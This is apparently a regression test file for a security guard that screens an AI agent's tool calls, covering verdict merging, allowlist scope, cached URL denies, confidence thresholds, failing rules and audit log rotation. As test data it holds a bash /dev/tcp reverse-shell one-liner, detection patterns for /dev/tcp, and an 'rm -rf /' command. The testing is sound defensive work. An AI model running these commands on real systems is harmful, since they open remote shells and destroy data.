/**
 * Regression tests for the core decision-pipeline review findings:
 *
 * - a non-deny policy verdict no longer replaces detection (deny > ask > allow);
 * - an invalid policy deny pattern no longer hides a later valid one;
 * - one allowlisted artifact no longer clears a whole multi-artifact call;
 * - a cached URL deny is applied even when the live verdict is `ask`;
 * - the confidence threshold is applied per signal, not across signals;
 * - a rule that throws while matching degrades the verdict instead of vanishing;
 * - audit rotation is serialized across processes and its loss is persisted.
 */
import { existsSync } from "node:fs";
import { mkdir, readFile, writeFile } from "node:fs/promises";
import { join, resolve } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
	getAuditLogLossState,
	getRecentEntries,
	logVerdict,
	readPersistedAuditLossState,
	resetAuditLogLossState,
} from "../audit-log.js";
import { VerdictCache } from "../cache.js";
import { DecisionEngine } from "../engine.js";
import { evaluateToolCall, runtimeRuleFailureVerdict } from "../evaluator.js";
import { extractFromBash, extractFromToolCall } from "../extractors.js";
import { HeuristicsEngine } from "../heuristics.js";
import type { HeuristicMatch, LoggingConfig, Threat, Verdict } from "../types.js";
import { VERSION } from "../version.js";
import { makeTmpDir, removeTmpDir } from "./test-utils.js";

const THREATS_DIR = resolve(__dirname, "..", "..", "..", "..", "threats");
const ALLOWLISTS_DIR = resolve(__dirname, "..", "..", "..", "..", "allowlists");
const REVERSE_SHELL = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";

let dirs: string[] = [];
async function tmp(): Promise<string> {
	const dir = await makeTmpDir();
	dirs.push(dir);
	return dir;
}

afterEach(async () => {
	vi.restoreAllMocks();
	vi.unstubAllEnvs();
	resetAuditLogLossState();
	for (const dir of dirs) await removeTmpDir(dir);
	dirs = [];
});

function aidrDir(home: string): string {
	return join(home, ".singularity-aidr");
}

/** Local mode, every remote leg and every side channel off. */
async function writeConfig(dir: string, extra: Record<string, unknown> = {}): Promise<string> {
	// State files (allowlist, cache) must live under ~/.singularity-aidr.
	vi.stubEnv("HOME", dir);
	vi.stubEnv("USERPROFILE", dir);
	await mkdir(aidrDir(dir), { recursive: true });
	const configPath = join(dir, "config.json");
	await writeFile(
		configPath,
		JSON.stringify({
			mode: "local",
			heuristics_enabled: true,
			control_plane: { enabled: false },
			url_check: { enabled: false },
			file_check: { enabled: false },
			package_check: { enabled: false },
			amsi_check: { enabled: false },
			cache: { enabled: false },
			logging: { enabled: false },
			incident: { enabled: false },
			response: { emit_incidents: false },
			...extra,
		}),
	);
	return configPath;
}

async function evaluate(
	dir: string,
	toolName: string,
	toolInput: Record<string, unknown>,
	configExtra: Record<string, unknown> = {},
	threatsDir = THREATS_DIR,
): Promise<Verdict> {
	const configPath = await writeConfig(dir, configExtra);
	return evaluateToolCall(
		{
			sessionId: "core-review",
			toolName,
			toolInput,
			artifacts:
				toolName === "Bash"
					? extractFromBash(String(toolInput.command))
					: extractFromToolCall(toolName, toolInput),
		},
		{
			configPath,
			threatsDir,
			allowlistsDir: ALLOWLISTS_DIR,
			userThreatsDir: join(dir, "user-threats"),
			workingDirectory: dir,
		},
	);
}

describe("policy verdicts merge with detection", () => {
	it("a require-approval runtime default does not mask a heuristic deny", async () => {
		const baseline = await evaluate(await tmp(), "Bash", { command: REVERSE_SHELL });
		expect(baseline.decision).toBe("deny");
		expect(baseline.matchedThreatId).toMatch(/^CLT-/);

		const verdict = await evaluate(
			await tmp(),
			"Bash",
			{ command: REVERSE_SHELL },
			{ policy: { enabled: true, runtime_defaults: { command_action: "require_approval" } } },
		);
		expect(verdict.decision).toBe("deny");
		expect(verdict.matchedThreatId).toBe(baseline.matchedThreatId);
		// The approval requirement is kept as a reason, not dropped.
		expect(verdict.reasons).toContain("Command blocked by runtime default");
	});

	it("a policy ask still applies when detection finds nothing", async () => {
		const verdict = await evaluate(
			await tmp(),
			"Bash",
			{ command: "ls -la" },
			{ policy: { enabled: true, runtime_defaults: { command_action: "require_approval" } } },
		);
		expect(verdict.decision).toBe("ask");
		expect(verdict.matchedThreatId).toBe("POL-DEFAULT-CMD-001");
	});

	it("an invalid deny pattern does not hide a later valid deny pattern", async () => {
		const verdict = await evaluate(
			await tmp(),
			"Bash",
			{ command: REVERSE_SHELL },
			{
				heuristics_enabled: false,
				policy: {
					enabled: true,
					shell: { enabled: true, deny_patterns: ["(", "dev/tcp"], deny_action: "block" },
				},
			},
		);
		expect(verdict.decision).toBe("deny");
		expect(verdict.matchedThreatId).toBe("POL-SH-001");
		expect(verdict.reasons).toContain("Shell deny pattern is invalid and was skipped");
	});

	it("an invalid deny pattern alone is a gap, never a clean result", async () => {
		const verdict = await evaluate(
			await tmp(),
			"Bash",
			{ command: "ls -la" },
			{
				policy: {
					enabled: true,
					shell: { enabled: true, deny_patterns: ["(", "never-matches-xyz"], deny_action: "block" },
				},
			},
		);
		expect(verdict.decision).toBe("ask");
		expect(verdict.matchedThreatId).toBe("POL-SH-UNAVAILABLE-001");
	});
});

describe("allowlist covers only the artifacts it names", () => {
	async function allowlistPath(dir: string, path: string): Promise<void> {
		await mkdir(aidrDir(dir), { recursive: true });
		await writeFile(
			join(aidrDir(dir), "allowlist.json"),
			JSON.stringify({
				file_paths: {
					[path]: { added_at: "2026-01-01T00:00:00Z", reason: "fp", original_verdict: "ask" },
				},
			}),
		);
	}

	it("an allowlisted path does not clear a reverse shell in the same MCP call", async () => {
		const dir = await tmp();
		const target = join(dir, "run.sh");
		await allowlistPath(dir, target);
		const verdict = await evaluate(dir, "mcp__shell__exec", {
			path: target,
			command: REVERSE_SHELL,
		});
		expect(verdict.decision).toBe("deny");
		expect(verdict.source).not.toBe("allowlisted");
	});

	it("an allowlisted path does not clear the content written to it", async () => {
		const dir = await tmp();
		const threats = join(dir, "threats");
		await mkdir(threats, { recursive: true });
		await writeFile(
			join(threats, "content.yaml"),
			`- id: "TST-CONTENT-001"
  category: command_execution
  severity: critical
  confidence: 0.99
  action: block
  pattern: "/dev/tcp/"
  match_on: content
  title: "Test reverse shell in written content"
`,
		);
		const target = join(dir, "run.sh");
		const input = { file_path: target, content: `#!/bin/sh\n${REVERSE_SHELL}\n` };
		expect((await evaluate(dir, "Write", input, {}, threats)).decision).toBe("deny");

		await allowlistPath(dir, target);
		const verdict = await evaluate(dir, "Write", input, {}, threats);
		expect(verdict.decision).toBe("deny");
		expect(verdict.matchedThreatId).toBe("TST-CONTENT-001");
	});

	it("a fully covered call still takes the allowlisted fast path", async () => {
		const dir = await tmp();
		await mkdir(aidrDir(dir), { recursive: true });
		await writeFile(
			join(aidrDir(dir), "allowlist.json"),
			JSON.stringify({
				urls: {
					"https://docs.example.test/page": {
						added_at: "2026-01-01T00:00:00Z",
						reason: "fp",
						original_verdict: "ask",
					},
				},
			}),
		);
		const verdict = await evaluate(dir, "WebFetch", { url: "https://docs.example.test/page" });
		expect(verdict.decision).toBe("allow");
		expect(verdict.source).toBe("allowlisted");
	});
});

describe("cached URL verdicts", () => {
	it("applies a cached deny even when the live verdict is ask", async () => {
		const dir = await tmp();
		const threats = join(dir, "threats");
		await mkdir(threats, { recursive: true });
		await writeFile(
			join(threats, "ask.yaml"),
			`- id: "TST-ASK-001"
  category: credential_access
  severity: high
  confidence: 0.95
  action: require_approval
  pattern: "read-secret-store"
  match_on: command
  title: "Test credential access"
`,
		);
		await mkdir(aidrDir(dir), { recursive: true });
		const cachePath = join(aidrDir(dir), "cache.json");
		const cacheConfig = {
			enabled: true,
			ttl_malicious_seconds: 3600,
			ttl_clean_seconds: 3600,
			path: cachePath,
			encryption: { enabled: false },
		};
		const cache = new VerdictCache(cacheConfig, undefined, VERSION);
		await cache.load();
		cache.putUrl(
			"https://bad.example.test/x",
			{ verdict: "deny", severity: "critical", reasons: ["Known malicious"], source: "url_check" },
			true,
		);
		await cache.save();

		const verdict = await evaluate(
			dir,
			"Bash",
			{ command: "read-secret-store https://bad.example.test/x" },
			{ cache: cacheConfig },
			threats,
		);
		expect(verdict.decision).toBe("deny");
		expect(verdict.source).toBe("cache(url_check)");
		// The live ask's reason is kept next to the cached deny.
		expect(verdict.reasons).toEqual(expect.arrayContaining(["Known malicious"]));
	});
});

describe("decision engine applies the threshold per signal", () => {
	const match = (
		id: string,
		category: string,
		confidence: number,
		action: Threat["action"],
	): HeuristicMatch =>
		({
			threat: { id, category, confidence, severity: "medium", action, title: id },
			artifact: id,
			matchValue: id,
		}) as unknown as HeuristicMatch;

	it("a confident advisory finding does not suppress a weak security escalation", async () => {
		const engine = new DecisionEngine("balanced");
		const verdict = await engine.decide({
			heuristicMatches: [
				match("SEC", "credential_access", 0.6, "log"),
				match("ADV", "secure_code_x", 0.99, "log"),
			],
			urlCheckResults: [],
		});
		expect(verdict.decision).toBe("ask");
	});

	it("a confident unrelated signal does not keep a weak deny at deny", async () => {
		const engine = new DecisionEngine("balanced");
		const verdict = await engine.decide({
			heuristicMatches: [
				match("WEAK-DENY", "exfiltration", 0.6, "block"),
				match("ADV", "secure_code_x", 0.99, "log"),
			],
			urlCheckResults: [],
		});
		expect(verdict.decision).toBe("ask");
		expect(verdict.matchedThreatId).toBe("WEAK-DENY");
	});

	it("a confident deny still wins over a weak one", async () => {
		const engine = new DecisionEngine("balanced");
		const verdict = await engine.decide({
			heuristicMatches: [
				match("WEAK-DENY", "exfiltration", 0.6, "block"),
				match("STRONG-DENY", "exfiltration", 0.95, "block"),
			],
			urlCheckResults: [],
		});
		expect(verdict.decision).toBe("deny");
		expect(verdict.matchedThreatId).toBe("STRONG-DENY");
	});
});

describe("rules that fail while matching", () => {
	it("records a throwing rule as unavailable", () => {
		const throwing = /x/;
		Object.defineProperty(throwing, "exec", {
			value: () => {
				throw new Error("boom");
			},
		});
		const threat = {
			id: "TST-THROW-001",
			category: "tool",
			severity: "high",
			confidence: 0.99,
			action: "block",
			title: "throws",
			matchOn: ["command"],
			compiledPattern: throwing,
		} as unknown as Threat;
		const engine = new HeuristicsEngine([threat]);
		vi.spyOn(console, "warn").mockImplementation(() => undefined);
		expect(engine.match([{ type: "command", value: "anything" }])).toEqual([]);
		expect(engine.unavailableThreats.map((entry) => entry.threatId)).toEqual(["TST-THROW-001"]);
	});

	it("turns an otherwise clean verdict into a degraded ask", async () => {
		vi.spyOn(HeuristicsEngine.prototype, "unavailableThreats", "get").mockReturnValue([
			{ threatId: "TST-THROW-001", reason: "boom" },
		]);
		const verdict = await evaluate(await tmp(), "Bash", { command: "ls -la" });
		expect(verdict.decision).toBe("ask");
		expect(verdict.category).toBe("detection_degraded");
		expect(verdict.reasons.join(" ")).toContain("TST-THROW-001");
	});

	it("keeps a stricter verdict and adds the gap as a reason", () => {
		const deny: Verdict = {
			decision: "deny",
			category: "tool",
			confidence: 1,
			severity: "critical",
			source: "heuristic",
			artifacts: [],
			matchedThreatId: "CLT-X",
			reasons: ["matched"],
		};
		const merged = runtimeRuleFailureVerdict(deny, [{ threatId: "TST-THROW-001" }]);
		expect(merged.decision).toBe("deny");
		expect(merged.matchedThreatId).toBe("CLT-X");
		expect(merged.reasons).toHaveLength(2);
	});
});

describe("audit log rotation", () => {
	const denial: Verdict = {
		decision: "deny",
		category: "test",
		confidence: 1,
		severity: "critical",
		source: "heuristic",
		reasons: ["test"],
		artifacts: [],
		matchedThreatId: "CLT-TEST-001",
	};

	function loggingConfig(path: string, maxBytes = 100): LoggingConfig {
		return { enabled: true, path, max_bytes: maxBytes, max_files: 2, log_clean: true };
	}

	it("persists the rotation drop counter for other processes", async () => {
		const dir = await tmp();
		const logPath = join(dir, "audit.jsonl");
		const config = loggingConfig(logPath);
		expect(await readPersistedAuditLossState(config)).toEqual({
			rotationDrops: 0,
			lastDropAt: null,
		});

		for (let i = 0; i < 2; i++) {
			await writeFile(logPath, `${"x".repeat(200)}\n`, "utf8");
			await writeFile(`${logPath}.2`, "oldest\n", "utf8");
			await logVerdict(config, "session-1", "Bash", { command: "rm -rf /" }, denial);
		}

		expect(getAuditLogLossState().rotationDrops).toBe(2);
		const persisted = await readPersistedAuditLossState(config);
		expect(persisted?.rotationDrops).toBe(2);
		expect(persisted?.lastDropAt).not.toBeNull();
		// The rotation lock is released after use.
		expect(existsSync(`${logPath}.lock`)).toBe(false);
	});

	it("does not rotate while another process holds the rotation lock", async () => {
		const dir = await tmp();
		const logPath = join(dir, "audit.jsonl");
		await writeFile(logPath, `${"x".repeat(200)}\n`, "utf8");
		await writeFile(`${logPath}.2`, "oldest\n", "utf8");
		// Another hook process is rotating this file right now.
		await writeFile(`${logPath}.lock`, "99999\n", "utf8");

		await logVerdict(loggingConfig(logPath), "session-1", "Bash", { command: "x" }, denial);

		// Nothing was shifted or dropped by this process, and the entry landed.
		expect(await readFile(`${logPath}.2`, "utf8")).toBe("oldest\n");
		expect(existsSync(`${logPath}.1`)).toBe(false);
		expect(getAuditLogLossState().rotationDrops).toBe(0);
		expect(getAuditLogLossState().writeFailures).toBe(0);
		expect(await readFile(logPath, "utf8")).toContain("CLT-TEST-001");
	}, 15_000);

	it("reads recent entries from the tail of a large log", async () => {
		const dir = await tmp();
		const logPath = join(dir, "audit.jsonl");
		const lines = Array.from({ length: 5000 }, (_, i) =>
			JSON.stringify({ n: i, pad: "p".repeat(64) }),
		);
		await writeFile(logPath, `${lines.join("\n")}\n`, "utf8");
		const recent = (await getRecentEntries(loggingConfig(logPath, 0), 3)) as Array<{ n: number }>;
		expect(recent.map((entry) => entry.n)).toEqual([4997, 4998, 4999]);
	});
});
